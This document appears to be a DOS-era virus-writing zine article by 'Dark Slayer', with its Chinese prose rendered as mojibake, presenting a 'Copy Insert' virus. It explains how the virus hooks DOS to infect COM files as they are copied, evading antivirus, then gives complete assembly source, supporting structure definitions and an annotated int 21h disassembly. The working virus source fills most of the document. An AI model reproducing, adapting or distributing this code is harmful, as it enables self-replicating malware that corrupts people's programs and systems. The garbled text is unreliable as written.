

        OvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvel
        v                                                              v
        e       »OÆW«Â¤O¯f¬r¬ã¨s²ÕÂ´ ²Ä ‘D ´Á Âø»x      P.001          e
        l       [¯f¬r]                                                 l
        O                                                              O
        v       «þ¨©´¡ªá¯f¬r                            Dark Slayer    v
        e       E-Mail: Megadeth.bbs@csie.nctu.edu.tw                  e
        l                                                              l
        OvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvel

        «þ¨©´¡ªá¯f¬r... ¬°¦ó¨ú³o»ò¦n¯ºªº¦W¦r©O? ¦]¬°¦¹¬r¦b«þ¨©®É¹ï¥Øªº
        ÀÉªº¼g¤J¸ê®Æ¥[¤u (´¡ªá) , ©Ò¥H§Ú¥s¥¦ copy insert :)

        ³o¼Ë°µ¦³¦ó¦n³B©O? ¦U¦ì·Q·Q... ·í§Ú­Ì°O¾ÐÅé±`¾n¦³¨¾¬rµ{¦¡, ¦Ó¦b
        «þ¨©ÀÉ®×®É, §Y¨Ï«þ¨©ªº¬O¤@­Ó°õ¦æÀÉ¨¾¬rµ{¦¡¤]¤£·|Äµ§i, ³o¬O¦]¬°
        ¨¾¬rµ{¦¡¬°¤F¤£³y¦¨µL¿×ªºÄµ§i¤~·|¦p¦¹ (·Q·Q¬Ý... ¦pªG§Aªº¨¾¬rµ{
        ¦¡¦b§A«þ¨©ÀÉ®×®ÉÀWÀWÄµ§i, ¨º»ò§AÁÙ·|·Q¥Î¥¦¶Ü?), ©Ò¥H³o¤]¥i¥H»¡
        ¬O¤@­Óº|¬}, ·í«þ¨©°õ¦æÀÉ®É, §Ú­Ì¥u­n¹ï¼g¤Jªº¸ê®Æ­×§ï, ¦Ó¼g¤Jªº
        °Ê§@´N¥æµ¹«þ¨©ªºµ{¦¡¨Ó°µ... ³o¼Ë§Ú­Ì´N§¹¦¨¤F·P¬V, ¦Ó "´¼¼z«¬"
        ¨¾¬rµ{¦¡´NÅÜ¦¨"´¼»Ù«¬", §b¦b¨ºÃä :)


        ok! ²z½×³¡¥÷ÙT§¹¤F, ²{¦b¨ÓÙT§Þ³N³¡¥÷...

        ¬Û«H¤j®a³£ª¾¹D§Ú­Ì­n¥[¤uªº¨t²Î¨ç¼Æ¬O ah=40h/int 21h §a? ­º¥ý­n
        §PÂ_©Ò¼g¤JªºÀÉ®×¥N½XªºÀÉ¦W¬O§_¬°°õ¦æÀÉ, «ç»ò°µ? §Q¥ÎSFT ´N¥i¥H
        ¨ú±oÀÉ®×¥N½XªºÀÉ¦W¤F... (¦¹¬r¥u·P¬V COM)

        µM«á§PÂ_¦¹ÀÉ¥N½X¬OÀÉ®×©Î³]³Æ (ex: CON, LPT, NUL... etc.), §Q¥Î
        SFT °¾²¾5 ªº³]³ÆÄÝ©Ê´N¥i§PÂ_¤F...

        ¦A¨Ó§PÂ_ÀÉ®×¥N½XªºÅª¼g«ü¼Ð¬O§_«ü¦V 0, ¦]¬°¼g¤Jªº¸ê®Æ­Y¬°ÀÉ®×¶}
        ºÝªº¸ê®Æ, ¨º»ò¹ï¨ä­×§ï¤~¯à¨ú±o¤@¶}©lªº±±¨îÅv...

        ¥H¤W±ø¥ó³£²Å¦X¤F¤§«á, ·j´M¼g¤Jªº¸ê®Æ¸Ì¬O§_¦³³sÄòªº n bytes ªº0
         (n = size of virus), ­Y¦³... «h±N¯f¬r½X«þ¤@¥÷¹L¥h, ¦b±N¸ê®Æ¶}
        ÀY«e3 bytes §ï¦¨ jmp, ¦p¦¹«K§¹¦¨·P¬V...

        §Úªº³oºØ·P¬Vªk, ·P¬V«áÀÉ®×¤j¤p¤£·|§ïÅÜ, ¦]¬°§Ú¬O´M§äÀÉ®×¤¤¦³¨¬
        °÷ªº 0, ¦A±N¯f¬r©ñ¦b¸Ó³B... ¤£¹L¦³¤@§Q´N¦³¤@¹ú, ¦³¦h¤ÖÀÉ®×¯à²Å
        ¦X³o­Ó¼Ð·Ç©O? ¤×¨ä¦³¨Ç°õ¦æÀÉ³£¥[¤WÀ£ÁY, ²Å¦X±ø¥óªº´N§ó¤Ö¤F, ³o
        °ÝÃD¦³¸Ñ¨Mªº¿ìªk... ¤£¹L¦³ÂI¦MÀI... §A¥i¥H¤£¥Î§Úªº·P¬Vªk... §Q
        ¥Î¤@¯ëªºªþ¦bÀÉ§Àªº·P¬V¤è¦¡, ¤£¹L§A±o¥ý°²³]¦s¸ê®Æªº°O¾ÐÅé¦³¦h¾l
        ªºªÅ¶¡Åý§A©ñ¯f¬r½X, ¤£¹L¦pªG°õ¦æ«þ¨©°Ê§@ªº¬OCOMMAND.COM ¨º»ò§Ú
        ­Ì´N¥i¥H¤£¥Î¾á¤ß³o­Ó°ÝÃD... ³o´N¯dµ¹§A¥hµo®i§a

        PS: ¦pªG§A«þ¨©¤F«Ü¦h°õ¦æÀÉ(COM) ³£¨S³Q·P¬V, ¨º»ò¸Õ¸Õ COMMAND :)

====================== beginning of copyins.asm ========================
include         structs.h       ; ¦¹ header file §Ú©ñ¤F³\¦h¦³¥Îªºµ²ºc

vir_size        equ     offset vir_end-offset start     ; ¯f¬r¦bÀÉ®×¤¤ªº size
vir_mem_size    equ     offset vir_mem_end-offset start ; ¯f¬r¦b­p¾ÐÅéªº size
vir_para_size   equ     (vir_mem_size+0fh)/10h  ; ¯f¬r¦b­p¾ÐÅéªº size (para)

                .model  tiny
                .code
                org     0
start:
                xor     bx,bx           ; ³o¤@¬q¶}©l¨ì sti ªºµ{¦¡
                mov     si,sp           ; ³£¬O¨ú¯f¬r°¾²¾...
                cli                     ; ¤]ºâ¬OÆZ¯S§Oªº¤èªk§a...
get_ofs:        pop     ax              ; ¦Û¤v·Q·Q¬Ý§Ú¬O«ç»ò°µ¨ìªº? :)
                xchg    ah,bh
                push    ax
                dec     sp
                pop     ax
                xchg    ah,bh
                push    ax
                jmp     $+2
stop_point      label   word
                jmp     get_ofs
                pop     ax
                xchg    ah,bh
                push    ax
                sub     sp,offset stop_point-offset start
                xchg    si,sp
                sti

                mov     cx,vir_size
                push    cx
int2a_point:    int     2ah     ; ax = cs:stop_point, TSR check

                mov     ah,52h  ; ¨ú²Ä¤@­Ó MCB ¦ì§}
                int     21h
                mov     ds,es:[bx-2]
                xor     di,di

search_last_mcb:cmp     byte ptr ds:mcb_sign[di],4dh    ; §PÂ_¬O§_¬°³Ì«á¤@
                je      next_mcb                        ; ­Ó MCB
                cmp     byte ptr ds:mcb_sign[di],5ah
                jne     last_mcb
next_mcb:       mov     dx,ds:mcb_para_size[di]         ; ­pºâ¤U¤@­Ó MCB ¦ì§}
                mov     ax,ds
                add     dx,ax
                inc     dx
                mov     ds,dx
                jmp     search_last_mcb

last_mcb:       mov     ds,ax                   ; ds = ax = ³Ì«á¤@­Ó MCB
                mov     bx,vir_para_size
                cmp     ds:mcb_para_size[di],bx ; MCB ¬O§_°÷¤j?
                jb      run_host
                sub     ds:mcb_para_size[di],bx ; À° MCB ´îªÎ¥HªÅ¥XªÅ¶¡
                add     ax,ds:mcb_para_size[di] ; ­pºâ©ÒªÅ¥XªÅ¶¡ªº¦ì§}
                inc     ax
                mov     es,ax
                push    si
                rep     movs byte ptr es:[di],cs:[si]   ; ·h®a :)
                pop     si
                mov     ds,cx                   ; ds = cx = 0
                mov     ax,offset int2a         ; Äd int 2ah
                xchg    ax,ds:[2ah*4]
                stosw
                mov     ax,es
                xchg    ax,ds:[2ah*4+2]
                stosw

run_host:       push    cs cs           ; °õ¦æ­ìÀÉ®×
                pop     ds es
                pop     cx
                mov     di,100h-2       ; di = 100h - 2 = 0feh
                push    di
                mov     ax,0aaf3h       ; word [0feh] = 0aaf3h = rep stosb
                                        ; rep stosb ¬O­n±N§Ú­Ìªº¯f¬r½X¶ñ¦^ 0
                stosw
                mov     al,0c3h         ; ¶ñ¦^­ìÀÉ®×«e 3 bytes
host_code1      equ     byte ptr $-1
                stosb
                mov     ax,0
host_code2      equ     word ptr $-2
                stosw
                mov     di,si
                ret                     ; jmp to 0feh


int2a:          cmp     ax,0ebh+100h*(offset get_ofs-offset stop_point-2)
                        ; TSR check
                jne     not_my_sister
                pop     ax
                        ; §ïªð¦^¦ì§}¨ì run_host °õ¦æ­ìÀÉ
                add     ax,offset run_host-(offset int2a_point+2)
                push    ax
                iret

not_my_sister:  push    ax bx cx dx si di ds es
                cmp     ah,82h          ; ¬°¦ó­n¤ñ¸û¬O§_¬° 82h? ½Ð¬Ý¤U­±ªº
                jne     int2a_exit_     ; ªþ¿ý»P¨äµù¸Ñ«K¥i©ú¥Õ
                cmp     bl,40h*2        ; ¤@¼Ë... ½Ð¬Ýªþ¿ý
                jne     int2a_exit_

                mov     ax,1218h
                int     2fh             ; ¨ú±o int 21h ©I¥sªÌªº°ïÅ| (½Ð¬Ýªþ¿ý)
                ; ds:si = dos caller stack

                mov     ax,1220h
                mov     bx,ds:dcs_bx[si]        ; bx = ÀÉ®×¥N½X
                int     2fh                     ; ¨ú JFT
                mov     ax,1216h
                mov     bl,es:[di]
                int     2fh                     ; ¨ú SFT

                mov     cx,ds:dcs_cx[si]        ; ±o©Ò±ý¼g¤J¸ê®Æªº¤j¤p
                cmp     cx,vir_size+3           ; ¤Ó¤p?
                jbe     int2a_exit_             ; «h¤£·P¬V
                mov     bx,ds:dcs_dx[si]
                mov     si,ds:dcs_ds[si]
                        ; si:bx = ds:dx = «ü¦V±ý¼g¤Jªº¸ê®Æ

                push    es
                pop     ds
                test    byte ptr ds:sft_dev_attr[di],80h ; ¤ñ¸ûÀÉ®×©Î³]³Æ?
                jnz     int2a_exit_
                cmp     byte ptr ds:sft_ext[di],'C'     ; ¤ñ¸û°ÆÀÉ¦W¬O§_¬° COM
                jne     int2a_exit_
                cmp     word ptr ds:sft_ext[di+1],'MO'
                jne     int2a_exit_
                mov     ax,word ptr ds:sft_seek_point[di]
                cwd     ; dx = 0 (if ax < 8000h)
                or      ax,word ptr ds:sft_seek_point[di+2]
                jnz     int2a_exit_             ; ÀÉ®×Åª¼g«ü¼Ð¬O§_¬° 0?

                mov     di,bx
                mov     es,si   ; es:di = si:bx = «ü¦V±ý¼g¤Jªº¸ê®Æ

                ; ´M§ä³sÄò¥B¨¬°÷ªº 0
search_zero:    inc     dx      ; °²³]§ä¨ì¤@­Ó 0
                scasb           ; ¬O§_¬° 0?
                je      zero
                cwd             ; ¤£¬O«h§â dx ²M¬° 0
zero:           cmp     dx,vir_size     ; ¬O§_¤w¸g¦³¨¬°÷ªº 0?
                jae     enogh_zero      ; ¬Oªº¸Ü´N·P¬V§a
                loop    search_zero     ; ¤£°÷... Ä~Äò¤ñ¸û¤U¤@ byte
                jmp     int2a_exit_     ; ­ü... ¤µ¥ÍµL½t·P¬V©p!!!
                                        ; §Æ±æ¨Ó¥@...

enogh_zero:     push    cs
                pop     ds
                xchg    si,ax           ; si = ax = 0
                mov     al,0e9h         ; al = 0e9h = opcode of jmp near
                xchg    al,es:[bx]      ; §ó§ï²Ä¤@ byte
                mov     ds:host_code1,al ; ¦s°_¨Ó
                sub     di,dx           ; ­pºâ jmp ªº°¾²¾
                lea     ax,[di-3]
                sub     ax,bx
                xchg    ax,es:[bx+1]    ; §ó§ï²Ä¤G­Ó word
                mov     word ptr ds:host_code2,ax       ; ¦s°_¨Ó

                mov     cx,dx           ; cx = dx = vir_size
                rep     movsb
int2a_exit_:    pop     es ds di si dx cx bx ax

int2a_exit:     db      0eah
vir_end:        dw      ?,?
vir_mem_end:
                end     start
====================== end of copyins.asm ==============================

====================== beginning of structs.asm ========================
; ¤@¨Ç¦³¥Îªº struc
sft             struc
sft_users       dw      ?
sft_mode        dw      ?
sft_attr        db      ?
sft_dev_attr    dw      ?
sft_dpb_ptr     dd      ?
sft_1st_clust   dw      ?
sft_time        dw      ?
sft_date        dw      ?
sft_size        dd      ?
sft_seek_point  dd      ?
sft_rel_clust   dw      ?
sft_abs_clust   dw      ?
sft_dir_sect    dw      ?
sft_dir_entries db      ?
sft_name        db      8 dup(?)
sft_ext         db      3 dup(?)
sft_shr_sft_ptr dd      ?
sft_shr_mchn_num dw     ?
sft_psp_seg     dw      ?
sft_shr_rec_ofs dw      ?
sft_last_rw_clust_no dw ?
sft             ends

exe_header      struc
eh_sign         dw      ?
eh_sect_mod     dw      ?
eh_sects        dw      ?
eh_rels         dw      ?
eh_header_para  dw      ?
eh_min_mem_para dw      ?
eh_max_mem_para dw      ?
eh_ss           dw      ?
eh_sp           dw      ?
eh_checksum     dw      ?
eh_ip           dw      ?
eh_cs           dw      ?
eh_1st_rel      dw      ?
eh_ovl_num      dw      ?
                db      32 dup(?)
eh_neh_ofs      dd      ?
exe_header      ends

new_exe_header  struc
neh_sign        dw      ?
neh_linker_ver  dw      ?
neh_entry_tb_ofs dw     ?
neh_entry_tb_size dw    ?
neh_crc         dd      ?
neh_prog_flags  db      ?
neh_app_flags   db      ?
neh_auto_data_seg_index dw ?
neh_init_loc_heap_size dw ?
neh_init_stack_size dw  ?
neh_ip          dw      ?
neh_cs          dw      ?
neh_sp          dw      ?
neh_ss          dw      ?
neh_seg_count   dw      ?
neh_mod_ref_count dw    ?
neh_nresid_name_size dw ?
neh_seg_tb_ofs  dw      ?
neh_resrc_tb_ofs dw     ?
neh_resid_name_tb_ofs dw ?
neh_mod_ref_ofs dw      ?
neh_import_name_tb_ofs dw ?
neh_nresid_name_tb_ofs dd ?
neh_movable_entry_count dw ?
neh_align_shift dw      ?
neh_resrc_tb_entry_count dw ?
neh_opert_system db     ?
neg_exe_flags   db      ?
neg_ret_thunk_ofs dw    ?
neh_seg_ref_thunk_ofs dw ?
neh_mini_code_swap_size dw ?
neh_expect_win_ver dw   ?
new_exe_header  ends

sys_header      struc
sh_next_ptr     dd      ?
sh_attr         dw      ?
sh_strat        dw      ?
sh_int          dw      ?
sh_name         db      8 dup(?)
sys_header      ends

dos_caller_stack struc
dcs_ax          dw      ?
dcs_bx          dw      ?
dcs_cx          dw      ?
dcs_dx          dw      ?
dcs_si          dw      ?
dcs_di          dw      ?
dcs_bp          dw      ?
dcs_ds          dw      ?
dcs_es          dw      ?
dcs_ip          dw      ?
dcs_cs          dw      ?
dcs_flags       dw      ?
dos_caller_stack ends

dir             struc
dir_drive       db      ?
dir_name        db      8 dup(?)
dir_ext         db      3 dup(?)
dir_attr        db      ?
                db      10 dup(?)
dir_time        dw      ?
dir_date        dw      ?
dir_start_clust dw      ?
dir_size        dd      ?
dir             ends

find            struc
find_drive      db      ?
find_find_name  db      8 dup(?)
find_find_ext   db      3 dup(?)
find_find_attr  db      ?
find_entry_count dw     ?
find_dir_1st_clust dw   ?
                db      4 dup(?)
find_attr       db      ?
find_time       dw      ?
find_date       dw      ?
find_size       dd      ?
find_name       db      13 dup(?)
find            ends

mcb             struc
mcb_sign        db      ?
mcb_onwer_seg   dw      ?
mcb_para_size   dw      ?
                db      3 dup(?)
mcb_name        db      8 dup(?)
mcb             ends

pcb             struc
pcb_env_var_seg dw      ?
pcb_parameter_ptr dd    ?
pcb_fcb1_ptr    dd      ?
pcb_fcb2_ptr    dd      ?
pcb_sp          dw      ?
pcb_ss          dw      ?
pcb_ip          dw      ?
pcb_cs          dw      ?
pcb             ends


boot_sector     struc
bs_jmp          db      3 dup(?)
bs_oem_name     db      8 dup(?)
bs_sector_size  dw      ?
bs_clust_sectors db     ?
bs_reserved_sectors dw  ?
bs_fat_count    db      ?
bs_root_dir_entries dw  ?
bs_sectors      dw      ?
bs_media_id     db      ?
bs_fat_sectors  dw      ?
bs_track_sectors dw     ?
bs_heads        dw      ?
bs_hidden_sectors dd    ?
bs_ext_sectors  dd      ?
bs_drive_count  db      ?
                db      ?
bs_boot_sign    db      ?
bs_id           dd      ?
bs_label        db      11 dup(?)
bs_fat_type     db      8 dup(?)
boot_sector     ends

partition_table struc
pt_active_id    db      ?
pt_boot_head    db      ?
pt_boot_sector  db      ?
pt_boot_track   db      ?
pt_system_id    db      ?
pt_last_head    db      ?
pt_last_sector  db      ?
pt_last_track   db      ?
pt_first_sect_no dd     ?
pt_sectors      dd      ?
partition_table ends
====================== end of structs.asm ==============================

<ªþ¿ý> DOS ªº int 21h ¶}©lµ{¦¡½X
FDC8:40F8 FA            CLI
FDC8:40F9 80FC6C        CMP     AH,6C
FDC8:40FC 77D2          JA      40D0
FDC8:40FE 80FC33        CMP     AH,33
FDC8:4101 7218          JB      411B
FDC8:4103 74A2          JZ      40A7
FDC8:4105 80FC64        CMP     AH,64
FDC8:4108 7711          JA      411B
FDC8:410A 74B5          JZ      40C1
FDC8:410C 80FC51        CMP     AH,51
FDC8:410F 74A4          JZ      40B5
FDC8:4111 80FC62        CMP     AH,62
FDC8:4114 749F          JZ      40B5
FDC8:4116 80FC50        CMP     AH,50
FDC8:4119 748E          JZ      40A9
FDC8:411B 06            PUSH    ES      ; ³oÃä©Ò push ªº¼È¦s¾¹ (¤]´N¬O call
FDC8:411C 1E            PUSH    DS      ; int 21h ©Ò¥Îªº¼È¦s¾¹), ¥i¥Î
FDC8:411D 55            PUSH    BP      ; ax=1218h/int 2fh ¨ú±o
FDC8:411E 57            PUSH    DI
FDC8:411F 56            PUSH    SI
FDC8:4120 52            PUSH    DX
FDC8:4121 51            PUSH    CX
FDC8:4122 53            PUSH    BX
FDC8:4123 50            PUSH    AX      ; ·í§Ú­Ì©I¥s ax=1218h/int 2fh «á,
                                ; ds:si µ¥©ó¦¹®É (push ax §¹«á) ªº ss:sp

FDC8:4124 8CD8          MOV     AX,DS
FDC8:4126 2E            CS:
FDC8:4127 8E1EE73D      MOV     DS,[3DE7]
FDC8:412B A3EC05        MOV     [05EC],AX
FDC8:412E 891EEA05      MOV     [05EA],BX
FDC8:4132 A18405        MOV     AX,[0584]
FDC8:4135 A3F205        MOV     [05F2],AX
FDC8:4138 A18605        MOV     AX,[0586]
FDC8:413B A3F005        MOV     [05F0],AX
FDC8:413E 33C0          XOR     AX,AX
FDC8:4140 A27205        MOV     [0572],AL
FDC8:4143 F606301001    TEST    BYTE PTR [1030],01
FDC8:4148 7503          JNZ     414D
FDC8:414A A33E03        MOV     [033E],AX
FDC8:414D FE062103      INC     BYTE PTR [0321]
FDC8:4151 89268405      MOV     [0584],SP
FDC8:4155 8C168605      MOV     [0586],SS
FDC8:4159 A13003        MOV     AX,[0330]
FDC8:415C A33C03        MOV     [033C],AX
FDC8:415F 8ED8          MOV     DS,AX
FDC8:4161 58            POP     AX      ; ¨ú¥X ax
FDC8:4162 50            PUSH    AX      ; push ¦^¥h
FDC8:4163 89262E00      MOV     [002E],SP
FDC8:4167 8C163000      MOV     [0030],SS
FDC8:416B 2E            CS:
FDC8:416C 8E16E73D      MOV     SS,[3DE7]
FDC8:4170 BCA007        MOV     SP,07A0
FDC8:4173 FB            STI
FDC8:4174 8CD3          MOV     BX,SS
FDC8:4176 8EDB          MOV     DS,BX
FDC8:4178 93            XCHG    BX,AX   ; bx = ax
FDC8:4179 33C0          XOR     AX,AX
FDC8:417B 36            SS:
FDC8:417C A2F605        MOV     [05F6],AL
FDC8:417F 36            SS:
FDC8:4180 812611060008  AND     WORD PTR [0611],0800
FDC8:4186 36            SS:
FDC8:4187 A25703        MOV     [0357],AL
FDC8:418A 36            SS:
FDC8:418B A24C03        MOV     [034C],AL
FDC8:418E 36            SS:
FDC8:418F A24A03        MOV     [034A],AL
FDC8:4192 40            INC     AX
FDC8:4193 36            SS:
FDC8:4194 A25803        MOV     [0358],AL
FDC8:4197 93            XCHG    BX,AX   ; ax = bx
FDC8:4198 8ADC          MOV     BL,AH   ; bl = ah (function call number)
FDC8:419A D1E3          SHL     BX,1    ; bx = ah * 2
FDC8:419C FC            CLD
FDC8:419D 0AE4          OR      AH,AH
FDC8:419F 7417          JZ      41B8
FDC8:41A1 80FC59        CMP     AH,59
FDC8:41A4 7444          JZ      41EA
FDC8:41A6 80FC0C        CMP     AH,0C
FDC8:41A9 770D          JA      41B8
FDC8:41AB 36            SS:
FDC8:41AC 803E200300    CMP     BYTE PTR [0320],00
FDC8:41B1 7537          JNZ     41EA
FDC8:41B3 BCA00A        MOV     SP,0AA0
FDC8:41B6 EB32          JMP     41EA
FDC8:41B8 36            SS:
FDC8:41B9 A33A03        MOV     [033A],AX
FDC8:41BC 36            SS:
FDC8:41BD C606230301    MOV     BYTE PTR [0323],01
FDC8:41C2 36            SS:
FDC8:41C3 C606200300    MOV     BYTE PTR [0320],00
FDC8:41C8 36            SS:
FDC8:41C9 C6062203FF    MOV     BYTE PTR [0322],FF
FDC8:41CE 50            PUSH    AX
FDC8:41CF B482          MOV     AH,82   ; ah = 82h
FDC8:41D1 CD2A          INT     2A      ; int 2ah ¦b³o¸Ì§Ú­Ì¯f¬r¨ú±o±±¨îÅv
FDC8:41D3 58            POP     AX
FDC8:41D4 36            SS:
FDC8:41D5 C606580300    MOV     BYTE PTR [0358],00
FDC8:41DA BC2009        MOV     SP,0920
FDC8:41DD 36            SS:
FDC8:41DE F6063703FF    TEST    BYTE PTR [0337],FF
FDC8:41E3 7405          JZ      41EA
FDC8:41E5 50            PUSH    AX
FDC8:41E6 E8974E        CALL    9080
FDC8:41E9 58            POP     AX
FDC8:41EA 2E            CS:
FDC8:41EB 8B9F9E3E      MOV     BX,[BX+3E9E]
FDC8:41EF 36            SS:
FDC8:41F0 871EEA05      XCHG    BX,[05EA]
FDC8:41F4 36            SS:
FDC8:41F5 8E1EEC05      MOV     DS,[05EC]
FDC8:41F9 36            SS:
FDC8:41FA FF16EA05      CALL    [05EA]
FDC8:41FE 36            SS:
FDC8:41FF 80268600FB    AND     BYTE PTR [0086],FB
FDC8:4204 FA            CLI
FDC8:4205 2E            CS:
FDC8:4206 8E1EE73D      MOV     DS,[3DE7]
FDC8:420A 803E850000    CMP     BYTE PTR [0085],00
FDC8:420F 7527          JNZ     4238
FDC8:4211 FE0E2103      DEC     BYTE PTR [0321]
FDC8:4215 8E168605      MOV     SS,[0586]
FDC8:4219 8B268405      MOV     SP,[0584]
FDC8:421D 8BEC          MOV     BP,SP
FDC8:421F 884600        MOV     [BP+00],AL
FDC8:4222 A1F205        MOV     AX,[05F2]
FDC8:4225 A38405        MOV     [0584],AX
FDC8:4228 A1F005        MOV     AX,[05F0]
FDC8:422B A38605        MOV     [0586],AX
FDC8:422E 58            POP     AX
FDC8:422F 5B            POP     BX
FDC8:4230 59            POP     CX
FDC8:4231 5A            POP     DX
FDC8:4232 5E            POP     SI
FDC8:4233 5F            POP     DI
FDC8:4234 5D            POP     BP
FDC8:4235 1F            POP     DS
FDC8:4236 07            POP     ES
FDC8:4237 CF            IRET

